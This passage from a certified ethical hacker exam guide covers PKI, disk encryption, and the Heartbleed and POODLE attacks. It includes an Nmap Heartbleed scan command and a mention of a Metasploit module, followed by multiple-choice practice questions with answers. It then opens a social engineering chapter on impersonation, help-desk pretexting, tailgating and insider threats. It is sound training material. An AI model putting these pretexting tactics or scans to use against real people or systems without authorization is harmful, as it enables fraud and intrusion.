system. A single authority system has a CA at the top that creates and issues certificates.
Users trust each other based on the CA. The hierarchical trust system also has a CA at
the top (which is known as the root CA) but makes use of one or more RAs to issue and
manage certificates. This system is the most secure because users can track the certificate
back to the root to ensure authenticity without a single point of failure.

A digital certificate is an electronic file that is used to verify a user’s identity, provid-
ing nonrepudiation throughout the system. The certificate typically follows the X.509
standard, which defines what should and should not be in a digital certificate. Version,
Serial Number, Subject, Algorithm ID (or Signature Algorithm), Issuer, Valid From
and Valid To, Key Usage, Subject’s Public Key, and Optional are all fields within a
digital certificate.

A self-signed certificate is one created and signed by the entity internally and never
intended to be used in any other situation or circumstance. Signed certificates generally
indicate a CA is involved and the signature validating the identity of the entity is con-
firmed via an external source—in some instances a VA. Signed certificates, as opposed
to self-signed certificates, can be trusted: assuming the CA chain is validated and not
corrupted, it’s good everywhere.

A digital signature is an algorithmic output that is designed to ensure the authenticity
(and integrity) of the sender. FIPS 186-4 specifies that the Digital Signature Algorithm
(DSA) be used in the generation and verification of digital signatures. DSA is a Federal
Information Processing Standard that was proposed by NIST in August 1991 for use in
its Digital Signature Standard (DSS). The steps in the use of a digital signature include
the hashing of the message, with the result of the hash being encrypted by the sender’s
private key. The recipient then decrypts the hash result using the sender’s public key,
verifying the sender’s identity.

Data at rest (DAR) is data that is in a stored state and not currently accessible. Pro-
tection of data on mobile devices and laptops from loss or theft while it is in a resting

11-ch11.indd 445 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

446

state usually entails full disk encryption (FDE), where pre-boot authentication (usually an
account and password) is necessary to “unlock” the drive before the system can even boot
up. FDE can be software or hardware based, and can use network-based authentication
(Active Directory, for example) and/or local authentication sources (a local account or
locally cached from a network source). Software-based FDE can even provide central
management, making key management and recovery actions much easier.

Tools helpful in encrypting files and folders for other protective services include
Microsoft Encrypted File System (EFS), VeraCrypt, AxCrypt, and GNU Privacy Guard.
The point is, full disk encryption may sound like a great idea in the boardroom, but once
the drive is unlocked, the data inside is not protected.

Encrypted communication methods include the following:

• Secure Shell (SSH) A secured version of Telnet, using TCP port 22, by default,
and relying on public key cryptography for its encryption.

• Secure Sockets Layer (SSL) Encrypts data at the Transport layer and above,
for secure communication across the Internet. It uses RSA encryption and digital
certificates and can be used with a wide variety of upper-layer protocols. SSL uses
a six-step process for securing a channel.

• Transport Layer Security (TLS) Uses an RSA algorithm of 1024 and 2048 bits;
TLS is the successor to SSL.

• Internet Protocol Security (IPSec) Network layer tunneling protocol that can
be used in two modes: tunnel (entire IP packet encrypted) and transport (data
payload encrypted).

• Pretty Good Privacy (PGP) Used for signing, compression, and encrypting
and decrypting e-mails, files, directories, and even whole disk partitions, mainly
in an effort to increase the security of e-mail communications.

Heartbleed and POODLE were (and still can be) successful attacks against secure
communications. Heartbleed exploits the heartbeat feature in OpenSSL, which tricks
the server into sending 64Kb of data from its memory. You can use the Nmap com-
mand nmap -d --script ssl-heartbleed --script-args vulns.showall -sV [host] to
search for the vulnerability: the return will say “State: NOT VULNERABLE” if you’re
good to go. The Metasploit auxiliary module openssl_heartbleed can be used to exploit
this. Open SSL versions 1.0.1 through 1.0.1f are vulnerable, and the CVE notation is
CVE-2014-0160.

POODLE (Padding Oracle On Downgraded Legacy Encryption) takes advantage
of backward-compatibility features in TLS clients, allowing sessions to drop back to
the vulnerable SSL 3.0, which has a design flaw that allows the padding data at the
end of a block cipher to be changed so that the encryption cipher becomes less secure
each time it is passed. Defined as “RC4 biases,” if the same secret is sent over several
sessions, more and more information about it will leak. Mitigation for POODLE is to
not use SSL 3.0 at all. You can implement TLS_FALLBACK_SCSV (a fake cipher suite
advertised in the Client Hello message, which starts the SSL/TLS handshake) on areas
that must remain backward compatible. Another mitigation is to implement some-
thing called “anti-POODLE record splitting.” In short, this splits records into several

11-ch11.indd 446 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

447

parts, ensuring none of them can be attacked. However, although this may frustrate the
exploit’s ability to gather data, it also may cause compatibility issues due to problems
in server-side implementations.

Cipher attacks fall into a few categories and types. Known plain-text attacks, cipher-
text-only attacks, and replay attacks are examples. Man-in-the-middle is usually listed as
a type of attack by many security professionals and study guides (depending on the test
version you get, it may even be listed as such). Just keep in mind that a man-in-the-middle
situation simply means the attacker has positioned himself between the two communicat-
ing entities. Brute force refers to an attempt to try every possible combination against a
target until successful.

Questions
1. Which of the following attacks acts as a man in the middle, exploiting fallback

mechanisms in TLS clients?
A. POODLE
B. Heartbleed
C. FREAK
D. DROWN

2. RC4 is a simple, fast encryption cipher. Which of the following is not true
regarding RC4?
A. RC4 can be used for web encryption.
B. RC4 uses block encryption.
C. RC4 is a symmetric encryption cipher.
D. RC4 can be used for file encryption.

3. An organization has decided upon AES with a 256-bit key to secure data exchange.
What is the primary consideration for this?
A. AES is slow.
B. The key size makes data exchange bulky and complex.
C. It uses a shared key for encryption.
D. AES is a weak cipher.

4. Joe and Bob are both ethical hackers and have gained access to a folder. Joe
has several encrypted files from the folder, and Bob has found one of them
unencrypted. Which of the following is the best attack vector for them to follow?
A. Cipher text only
B. Known plain text
C. Chosen cipher text
D. Replay

11-ch11.indd 447 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

448

5. You are reviewing an organization’s security plans and policies, and you want to
add protection for the organization’s laptops. Which effort listed protects system
folders, files, and MBR until valid credentials are provided at pre-boot?
A. Cloud computing
B. SSL/TLS
C. Full disk encryption
D. AES

6. Which of the following is used to distribute a public key within the PKI system,
verifying the user’s identity to the recipient?
A. Digital signature
B. Hash value
C. Private key
D. Digital certificate

7. A hacker feeds plain-text files into a hash, eventually finding two or more that
create the same fixed-value hash result. This anomaly is known as what?
A. Collision
B. Chosen plain text
C. Hash value compromise
D. Known plain text

8. An attacker uses a Metasploit auxiliary exploit to send a series of small messages
to a server at regular intervals. The server responds with 64Kb of data from its
memory. Which of the following best describes the attack being used?
A. POODLE
B. Heartbleed
C. FREAK
D. DROWN

9. Which of the following statements is true regarding encryption algorithms?
A. Symmetric algorithms are slower, are good for bulk encryption, and have no

scalability problems.
B. Symmetric algorithms are faster, are good for bulk encryption, and have no

scalability problems.
C. Symmetric algorithms are faster, are good for bulk encryption, but have

scalability problems.
D. Symmetric algorithms are faster but have scalability problems and are not

suited for bulk encryption.

11-ch11.indd 448 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

449

10. Within a PKI system, Julia encrypts a message for Heidi and sends it. Heidi
receives the message and decrypts the message using what?
A. Julia’s public key
B. Julia’s private key
C. Heidi’s public key
D. Heidi’s private key

11. Which of the following is a symmetric encryption method that transforms a
fixed-length amount of plain text into an encrypted version of the same length?
A. Stream
B. Block
C. Bit
D. Hash

12. Which symmetric algorithm uses variable block sizes (from 32 to 128 bits)?
A. DES
B. 3DES
C. RC
D. MD5

13. Which hash algorithm produces a 160-bit output value?
A. SHA-1
B. SHA-2
C. Diffie-Hellmann
D. MD5

14. Two different companies each have their own public key infrastructure up and
running. When the two companies merge, security personnel want both PKIs
to validate certificates from each other. What must the CAs for both companies
establish to accomplish this?
A. Key exchange portal
B. Key revocation portal
C. Cross-site exchange
D. Cross-certification

15. Within a PKI, which of the following verifies the applicant?
A. Registration authority
B. User authority
C. Revocation authority
D. Primary authority

11-ch11.indd 449 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

450

16. Which of the following is a software application used to asymmetrically encrypt
and digitally sign e-mail?
A. PGP
B. SSL
C. PPTP
D. HTTPS

Answers
1. A. In a POODLE attack, the man in the middle interrupts all handshake

attempts by TLS clients, forcing a degradation to a vulnerable SSL version.
2. B. RC4 is a simple, fast, symmetric stream cipher. It can be used for almost

everything you can imagine an encryption cipher could be used for (you can
even find it in WEP).

3. C. AES is a symmetric algorithm, which means that the same key is used for
encryption and decryption. The organization will have to find a secured means
to transmit the key to both parties before any data exchange.

4. B. In a known plain-text attack, the hacker has both plain-text and cipher-text
messages; the plain-text copies are scanned for repeatable sequences, which are
then compared to the cipher-text versions. Over time, and with effort, this can
be used to decipher the key.

5. C. FDE is the appropriate control for data-at-rest protection. Pre-boot
authentication provides protection against loss or theft.

6. D. A digital certificate contains, among other things, the sender’s public key, and
it can be used to identify the sender.

7. A. When two or more plain-text entries create the same fixed-value hash result, a
collision has occurred.

8. B. Heartbleed takes advantage of the data-echoing acknowledgement heartbeat in
SSL. OpenSSL versions 1.0.1 through version 1.0.1f are vulnerable to this attack.

9. C. Symmetric algorithms are fast, are good for bulk encryption, but have scalability
problems.

10. D. Heidi’s public key is used to encrypt the message. Her private key is used to
decrypt it.

11. B. Block encryption takes a fixed-length block of plain text and converts it to
an encrypted block of the same length.

12. C. Rivest Cipher (RC) uses variable block sizes (from 32 to 128 bits).

11-ch11.indd 450 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

451

13. A. SHA-1 produces a 160-bit output value.
14. D. When PKIs need to talk to one another and trust certificates from either side,

the CAs need to set up a mutual trust known as cross-certification.
15. A. A registration authority (RA) validates an applicant into the system, making

sure they are real, valid, and allowed to use the system.
16. A. Pretty Good Privacy (PGP) is used for signing, compression, and encrypting

and decrypting e-mails, files, directories, and even whole disk partitions, mainly
in an effort to increase the security of e-mail communications.

11-ch11.indd 451 14/09/21 4:06 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CHAPTER

Low Tech: 12
Social Engineering
and Physical Security
In this chapter you will

• Deine social engineering
• Describe dierent types o social engineering techniques and attacks
• Describe identity thet
• List social engineering countermeasures
• Describe physical security measures

As the story goes, a large truck was barreling down a highway one day carrying equip-
ment needed to complete a major public safety project. The deadline was tight, and the
project would be doomed to failure if the parts were delayed for too long. As it journeyed
down the road, the truck came to a tunnel and was forced to a stop—the overhead clear-
ance was just inches too short, not allowing the truck to pass through, and there was no
way around the tunnel. Immediately calls were made to try to solve this problem.

Committees of engineers were quickly formed and solutions drawn up, with no idea
too outlandish and no expense spared. Tiger teams of geologists were summoned to gauge
the structural integrity of the aging tunnel in preparation for blasting the roof higher for
the truck to pass. The U.S. Air Force was consulted on the possibility of airlifting the
entire truck over the mountain via helicopter. And, while all this was going on, hundreds
gathered at the blocked entrance to the tunnel, everyone postulating their own theory.

A little girl wandered out of the crowd and walked up to the lead engineer, who was
standing beside the truck scratching his head and wondering what to do. She asked,
“Why is the truck blocking the road?” The man answered, “Because it’s just too tall to
get through the tunnel.” She then asked, “And why are all these people here looking
at it?” The man calmly answered, “Well, we’re all trying to figure out how to get it
through to the other side without blowing up the mountain.” The little girl looked at
the truck, gazed up at the man, and said, “Can’t you just let some air out of the tires
and roll it through?”

453

12-ch12.indd 453 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

454

Sometimes we overcomplicate our options, especially in this technology-charged
career field we’re in. We look for solutions that (we hope) will impress our peers. We
seem to prefer the most complicated option—to have to learn some vicious code listing
that takes six servers churning away in our basement to break past our target’s defenses.
We look for the tough way to break in when sometimes simply asking someone for a key
would work. Want to be a successful ethical hacker? Learn to take pride in, and master,
the simple techniques. Sometimes the easy answer isn’t just one way to do it—it’s the best
way. This chapter is all about the nontechnical options you may not even think about as
a “hacker.” Checking the simple stuff first, targeting the human element and the physical
attributes of a system, is not only a good idea, it’s critical to your overall success.

When it comes to your exam, social engineering and physical security aren’t covered
heavily. In fact, outside of phishing, many of you won’t see much of either topic on
your exam. That does not mean they are not important—in my humble opinion,
social engineering is as important as many of the technical efforts you’ll use on your
job. I’m not saying you’ll always be able to talk your way into a hardened facility or
gather connectivity credentials just by smiling and talking nicely, but I am saying social
engineering is a very important part of successful hacking and pen testing. And isn’t that
what this is all supposed to be about anyway?

Social Engineering
Every major study on technical vulnerabilities and hacking will say the same two things.
First, the users themselves are the weakest security link. Whether on purpose or by mis-
take, users, and their actions, represent a giant security hole that simply can’t ever be
completely plugged. Second, an inside attacker poses the most serious threat to overall
security. Although most people agree with both statements, they rarely take them in tan-
dem to consider the most powerful—and scariest—flaw in security: What if the inside
attacker isn’t even aware she is one? Welcome to the nightmare that is social engineering.

Show of hands, class: How many of you have held the door open for someone racing
up behind you, with his arms filled with bags? How many of you have slowed down to
let someone out in traffic, allowed the guy with one item in line to cut in front of you,
or carried something upstairs for an older person in your building? I, of course, can’t see
the hands raised, but I bet most of you have performed these, or similar, acts on more
than one occasion. This is because most of you see yourselves as good, solid, trustworthy
people, and given the opportunity, most of us will come through to help our fellow
human in times of need.

For the most part, people naturally trust one another—especially when authority of
some sort is injected into the mix—and they will generally perform good deeds for one
another. This engrained desire to trust is part of what some might say is human nature,
however that may be defined. It’s what separates us from the animal kingdom, and the
belief that most people are good at heart is one of the things that makes life a joy for a
lot of folks. Unfortunately, it also represents a glaring weakness in security that attackers
gleefully, and successfully, take advantage of.

12-ch12.indd 454 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

455

Social engineering is the art of manipulating a person, or a group of people, into
providing information or a service they otherwise would never have given. Social
engineers prey on people’s natural desire to help one another, their tendency to listen
to authority, and their trust of offices and entities. For example, I bet the overwhelming
majority of users will say, if asked directly, that they would never share their password
with anyone. However, I also bet that a pretty decent percentage of that same group will
gladly hand over their password—or provide an easy means of getting it—if they’re asked
nicely by someone posing as a help desk employee or network administrator. I’ve seen it
too many times to doubt it. Put that request in an official-looking e-mail, and the success
rate can go up even higher.

EXAM TIP I doubt this will appear on the exam, but in the interest o
covering everything, you should know that EC-Council deines our phases
o successul social engineering:

1. Research (dumpster dive, visit websites, tour the company, and so on).
2. Select the victim (identiy rustrated employee or other promising targets).
3. Develop a relationship.
4. Exploit the relationship (collect sensitive inormation).

Social engineering is a nontechnical method of attacking systems, which means it’s
not limited to people with technical know-how. Whereas “technically minded” people
might attack firewalls, servers, and desktops, social engineers attack the help desk, the
receptionist, and the problem user down the hall everyone is tired of working with.
It’s simple, easy, effective, and darn near impossible to contain. And I’d bet dollars to
doughnuts the social engineer will often get just as far down the road in successful
penetration testing in the same amount of time as the “technical” folks.

And why do these attacks work? Well, EC-Council defines five main reasons and four
factors that allow them to happen. The following are all reasons people fall victim to
social engineering attacks:

• Human nature (trusting in others)

• Ignorance of social engineering efforts

• Fear (of consequences of not providing requested information)

• Greed (promised gain for providing the requested information)

• A sense of moral obligation

As for the factors that allow these attacks to succeed, insufficient training, unregulated
information (or physical) access, complex organizational structure, and lack of security
policies all play roles. Regardless, you’re probably more interested in the “how” of social
engineering opposed to the “why it works,” so let’s take a look at how these attacks are
actually carried out.

All social engineering attacks fall into one of three categories: human based, computer
based, or mobile based.

12-ch12.indd 455 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

456

Human-Based Social Engineering Attacks
Human-based social engineering uses interaction in conversation or other circumstances
between people to gather useful information. This can be as blatant as simply asking
someone for their password or as elegantly wicked as getting the target to call you with
the information—after a carefully crafted setup, of course. The art of human interaction
for information gathering has many faces, and there are innumerable attack vectors to
consider. We’ll just stick to what ECC expects you to know for your exam.

Dumpster diving is what it sounds like—a dive into a trash can of some sort to look
for useful information. However, the truth of real-world dumpster diving is a horrible
thing to witness or be a part of. Dumpster diving is the traditional name given to what
some people affectionately call “TRASHINT,” or trash intelligence. Sure, rifling through
the dumpsters, paper-recycling bins, and office trash cans can provide a wealth of
information (like written-down passwords, sensitive documents, access lists, PII, and so
on), but you’re just as likely to find hypodermic needles, rotten food, and generally the
vilest things you can imagine. Oh, and here’s a free tip for you—make sure you do this
outside. Pulling trash typically requires a large area, where the overall smell of what you
retrieve won’t infect the building in which you’re operating. Air freshener, thick gloves,
a mask, and a strong stomach are mandatory. To put this mildly, Internet tough guys
are often no match for the downright nastiness of dumpster diving, and if you must
resort to it, good luck. Dumpster diving isn’t as much “en vogue” as it used to be (after
all, paperless environments and the advent of smartphones and other hand-held devices
eliminated most of the goodies left lying around), but in specific situations it may still
prove valuable. Although technically a physical security issue, dumpster diving is covered
as a social engineering topic per EC-Council.

NOTE Sometimes the condition in which you ind dumpster material can
be an indicator o potentially important inormation. I you’re riling through
tons o paperwork ound in a dumpster but lots o it is strip-shredded, the
documents likely were shredded or a reason.

One of the more common forms of social engineering, impersonation encompasses
a huge swath of attack vectors. Basically, the social engineer pretends to be someone or
something he or she is not, and that someone or something—like, say, an employee,
a valid user, a repairman, an executive, a help desk person, an IT security expert…
heck, even an FBI agent—is someone or something the target either respects, fears, or
trusts. Pretending to be someone you’re not can result in physical access to restricted
areas (providing further opportunities for attacks), not to mention access to any sensitive
information (including credentials) your target feels you have a need and right to know.
Pretending to be a person of authority introduces intimidation and fear into the mix,
which sometimes works well on “lower-level” employees, convincing them to assist in
gaining access to a system or, really, anything you want. Just keep in mind the familiar
refrain we’ve kept throughout this book and be careful—you might think pretending to
be an FBI agent will get a password out of someone, but you need to be aware the FBI
will not find that humorous at all. Impersonation of law enforcement, military officers,

12-ch12.indd 456 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

457

or government employees is a federal crime, and sometimes impersonating another
company can get you in hot water. So, again, be careful.

Of course, as an attacker, if you’re going to impersonate someone, why not impersonate
a tech support person? Calling a user as a technical support person and warning him of
an attack on his account almost always results in good information.

Tech support professionals are trained to be helpful to customers—it’s their goal to
solve problems and get users back online as quickly as possible. Knowing this, an attacker
can call up posing as a user and request a password reset. The help desk person, believing
they’re helping a stranded customer, unwittingly resets a password to something the
attacker knows, thus granting him access the easy way. Another version of this attack is
known as authority support.

EXAM TIP Using a phone during a social engineering eort is known as
“vishing” (short or voice phishing). No, I don’t make this stu up.

Shoulder surfing and eavesdropping are other valuable human-based social engineering
methods. Assuming you already have physical access, it’s amazing how much information
you can gather just by keeping your eyes open. An attacker taking part in shoulder
surfing simply looks over the shoulder of a user and watches them log in, access sensitive
data, or provide valuable steps in authentication. Believe it or not, shoulder surfing can
also be done “long distance,” using vision-enhancing devices such as telescopes and
binoculars. And don’t discount eavesdropping as a valuable social engineering effort.
While standing around waiting for an opportunity, an attacker may be able to discern
valuable information by simply overhearing conversations. You’d be amazed what people
talk about openly when they feel they’re in a safe space.

Tailgating is something you probably already know about, but piggybacking is
a rather ridiculous definition term associated with it you’ll need to remember, even
though many of us use the terms interchangeably. Believe it or not, there is a semantic
difference between them on the exam—sometimes. Tailgating occurs when an attacker
has a fake badge and simply follows an authorized person through the opened security
door. Piggybacking is a little different in that the attacker doesn’t have a badge but asks
for someone to let her in anyway. She may say she’s left her badge on her desk or at
home. In either case, an authorized user holds the door open for her even though she
has no badge visible.

EXAM TIP I you see an exam question listing both tailgating and
piggybacking, the dierence between the two comes down to the
presence o a ake ID badge (tailgaters have them, piggybackers don’t).
On questions where they both do not appear as answers, the two are used
interchangeably. No, I don’t know why.

Another access card attack that’s worth mentioning here may not be on your exam, but
it should be (and probably will at some point in the near future). Suppose you’re minding
your own business, wandering around to get some air on a nice, sunny afternoon at

12-ch12.indd 457 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

458

work. A guy with a backpack accidentally bumps into you and, after several “I’m sorry—
didn’t see you man!” apologies, he wanders off. Once back in his happy little abode
he duplicates the RFID signal from your access card and, just like that, your physical
security access card is now his.

RFID identity theft (sometimes called RFID skimming) is usually discussed regarding
credit cards, but assuming the bad guy has the proper equipment (easy enough to
obtain) and a willingness to ignore the FCC, it’s a huge concern regarding your favorite
proximity/security card. Again, this isn’t in the official study material as far as I can find,
so I’m not sure there is a specific name given to the attack by ECC, but the principle is
something you need to be aware of—both as a security professional looking to protect
assets and as an ethical hacker looking to get into a building.

Another really devious social engineering impersonation attack involves getting the
target to call you with the information, known as reverse social engineering. The attacker
will pose as some form of authority or technical support and set up a scenario whereby
the user feels he must dial in for support. And, like seemingly everything involved in
this certification exam, the attack involves specific steps: advertisement, sabotage, and
support. First, the attacker advertises or markets his position as “technical support” of
some kind. In the second step, the attacker performs some sort of sabotage, whether
a sophisticated DoS attack or simply pulling cables. In any case, the damage is such
that the user feels they need to call technical support, which leads to the third step: the
attacker attempts to “help” by asking for login credentials, thus completing the third step
and gaining access to the system.

NOTE Reverse social engineering actually points out a general truth in the
pen testing world: inside-to-outside communication is always more trusted
than outside-to-inside communication. Having someone internal call you,
the pen tester, instead o the other way around, is akin to starting a drive
on the opponent’s one-yard line; you’ve got a much greater chance o
success this way.

For example, suppose a social engineer has sent an e-mail to a group of users warning
them of “network issues tomorrow” and has provided a phone number for the “help
desk” if they are affected. The next day, the attacker performs a simple DoS on the
machine, and the user dials up, complaining of a problem. The attacker then simply
says, “Certainly I can help you—just give me your ID and password, and we’ll get you
on your way.”

Regardless of the “human-based” attack you choose, remember that presentation is
everything. The “halo effect” is a well-known and well-studied phenomenon of human
nature, whereby a single trait influences the perception of other traits. If, for example, a
person is attractive, studies show that people will assume they are more intelligent and will
also be more apt to provide them with assistance. Humor, great personality, and a “smile
while you talk” voice can take you far in social engineering. Remember, people want to
help and assist you (most of us are hardwired that way), especially if you’re pleasant.

12-ch12.indd 458 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

459

Social Engineering in the Real World
Since we’re spending an entire chapter on what amounts to charming your way into
access that you otherwise would need technology, tools, time, and specific skills to
achieve, I thought it might be beneficial to see if it actually works in the real world.
Now don’t get me wrong here, I am not saying social engineering isn’t a skill. Quite
the contrary, as I know folks who are maestros at the art. However, there seems to
be some weird perception that social engineering is just easy, and since it’s so simple
it couldn’t possibly work as well as a team of hackers working together in a darkened
room somewhere.

If you’re of that mindset, it’s time for a little education. I searched for social
engineering case studies and found more than I could include here for you, so I’ll
just a grab a few from the top of the heap.

For example, let’s take a look at the case of an American network service provider
losing $39.1 million to attackers in 2015. You may be wondering how the attackers
got in, what attack vector they chose, and what leftover vulnerability patch allowed
them to get in, taking time to escalate privileges and then moving around to
steal money. And while the answers to any of those questions would probably be
concerning enough, the real attack was so much simpler, so ridiculous on its face,
you won’t believe it: the attackers simply e-mailed company employees and asked
them to send money. It’s true! The attackers wrote e-mails introducing themselves as
executive members of the company and then asked employees in finance to transfer
large amounts of money to a bank account they, the cybercriminals, owned.

And how about the famous attack used by a security audit team on the Warsaw
(Poland) branch of an international corporation? Even though the company had
state-of-the-art hardware and software security systems, eight pizzas were enough to
get past it all. The security audit team sent an e-mail to company employees advising
them that a new pizza place was opening close to the building and, as part of grand
opening, the first few orders for pizzas would get a 30 percent discount and a free gift.

Some employees thought this a great idea and organized an impromptu Pizza
Day for their office, ordering eight pizzas from the site. Security audit personnel,
posing as pizza delivery persons, showed up several minutes later with the pizzas,
the promised 30 percent discount, and their free gifts—eight USB sticks with LED
lamps that changed colors to music rhythms. Gleefully, the employees plugged them
into their computers and voilà!—the security audit team had remote access to the
company’s computer infrastructure and demonstrated they could have destabilized
the entire company in just a few minutes.

More? Try these on for size:

• An attacker posing as a new employee called the U.S. Justice Department
and simply asked for the access code to a restricted website, which resulted
in twenty thousand FBI employees and nine thousand employees of the
U.S. Department of Homeland Security having their personal data leaked.

(continued )

12-ch12.indd 459 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

460

• Ever seen the television show Shark Tank? An attacker posing as an assistant
to one of the “sharks,” Barbara Corcoran, sent an e-mail to a bookkeeper
requesting a renewal payment for some real estate investments. $400,000
later, the fraud was discovered when the bookkeeper sent an e-mail to the
assistant’s correct address asking about the transaction.

• In 2019 an attacker called a finance executive at Toyota Boshoku
Corporation and somehow convinced the executive to change a recipient’s
bank account information for a recurring upcoming wire transfer. The
attack resulted in the loss of just over $37 million.

We could go on and one here, and interesting stories about these types of attacks
abound online, but the point is social engineering not only works, but works well—
and often. And before you climb onto your high horse of intellectual superiority
and claim there’s no way it could happen to you, I challenge you to consider the
most common implementation of social engineering you’ll see in your day-to-day
life—the salesperson.

You’ve never purchased something and, afterward, thought, “I don’t need this!
Why did I get it?” You’ve never gone to an auto dealership and left with more than
you wanted, sometimes even with a different car than you went there for?”

Salespersons are trained to be excellent social engineers, and the good ones
are experts at the craft. Think about it—the goal of the social engineer and the
salesperson is the same: convince someone to do something they would not
normally do. Whether that is spending $600 on cosmetics when they only came in
for mascara, or getting someone to give you the password to a system you should
not have access to, the methods for getting there are strikingly similar.

I’d never really thought about social engineering within the context of retail, but
seeing my children work as salespersons and reading material on influence and sales
in particular has opened my eyes. Next time you’re at a store or a car dealership, pay
attention to customer interactions through the lens of a social engineer. There’s a
lot to learn.

Finally, this portion of the chapter can’t be complete without a quick discussion of
what EC-Council has determined to be the single biggest threat to your security—the
insider attack. I mean, after all, they’re already inside your defenses. You trust them and
have provided them with the access, credentials, information, and resources to do their
job. If one of them goes rogue or decides for whatever reason they want to inflict damage,
there’s not a whole lot you can do about it. What if an employee decides to spy for the
competition, to bring home a little extra money from time to time? And if that’s not bad
enough, suppose you add anger, frustration, and disrespect to the situation. Might an
angry, disgruntled employee go the extra step beyond self-gratification and just try to burn
the whole thing down? You better believe they will.

12-ch12.indd 460 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

Chapter 12: Low Tech: Social Engineering and Physical Security

461

Disgruntled employees get that way for a variety of reasons. Maybe they’re just angry
at the organization itself because of some policy, action, or political involvement. Maybe
they’re angry at a real or perceived slight—sometimes it’s seeing someone else take
credit for their work, and sometimes it’s as simple as not hearing “thank you for doing
a good job” enough. And sometimes they’re just mad at the people they work with on
a day-to-day basis—whether they’re peers or supervisors. Interpersonal relationships in
the office place are oftentimes the razor’s edge. A disgruntled employee—someone who
is angry at the circumstances and situations surrounding his duties, the organization
itself, or even the people he works with—has the potential to do some serious harm to
the bottom line.

EXAM TIP There are our semantic twists with insider names to create a
“type” o insider threat or you to memorize. However, they’re all airly
sel-explanatory. For instance, a negligent insider is probably the one
choosing lax security and the easiest path, while a professional insider is
one speciically looking to exploit his insight or personal gain. A malicious
insider is a disgruntled employee intentionally introducing malware, and
a compromised insider is someone who has been compromised by an
outside agent.

And there’s more to consider regarding disgruntled employees than just the obvious.
While you may instantly be picturing an angry employee “hacking” his way around
inside the network to exact revenge on the company, suppose the “attack” isn’t technical
in nature at all. Suppose the employee just takes the knowledge and secrets in his head and
provides them to the competition over lunch at Applebee’s? For added fun, also consider
that the disgruntled employee doesn’t even need to still be employed at your organization
to cause problems. A recently fired angry employee potentially holds a lot of secrets and
information that can harm the organization, and she won’t need to be asked nicely to
provide it. It’s enough to make you toss your papers in the air and take off for the woods.
Certainly you can enforce security policies and pursue legal action as a deterrent, and you
can practice separation of duties, least privilege, and controlled access all you want, but
at some point you must trust the individuals who work in the organization. Your best
efforts may be in vetting the employees in the first place, ensuring you do your absolute
best to provide everything needed for them to succeed at work, and making sure you
have really good disaster recovery and continuity of operations procedures in place.

NOTE EC-Council’s oicial courseware once recommended The Italian Job,
Catch Me If You Can, and Matchstick Men as educational movies on social
engineering. While I won’t necessarily argue with their choices, the entire
time I was writing about disgruntled employees I was thinking about Milton
and his red stapler rom Office Space (he didn’t socially engineer anything,
but he sure did show what a motivated disgruntled employee can do). And
as ar as movies go, Ferris Bueller’s Day Off is almost entirely dedicated to
social engineering, even i it was just about a high school kid.

12-ch12.indd 461 14/09/21 4:07 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 12

CEH Certified Ethical Hacker All-in-One Exam Guide

462

Finally, in this disgruntled employee/internal user discussion, there’s one other
horrifying idea to consider. I’ve discussed before in this book how a hacker always has the
advantage of time, so what happens if an attacker is really dedicated to the task and just
applies for a job in your organization? As I’ve said multiple times, your insider risks far
outweigh external ones; the insider is already trusted, so a lot of your defenses won’t come
into play. And if that’s the case, what’s to stop a dedicated hacker from applying for a job
and working a couple of months to set up their attack? How hard could it be to generate
a good resume and find a job in a company?

I know from experience how difficult finding truly talented employees in the IT
sector can be, and HR departments are accustomed to seeing IT resumes with multiple,
short-term job listings on them. Hiring managers, over time, can even get desperate
to find the right person for a given need, and it’s a gold mine for a smart hacker. The
prospect of a bad guy simply walking in to the organization with a badge and access
I gave him is frightening to me, and it should concern you and your organization as well.
Just remember that hackers aren’t the pimply faced teenage kids sitting in a dark room
anymore. They’re highly intelligent, outgoing folks, and they oftentimes have one heck
of a good resume.

Computer-Based Attacks
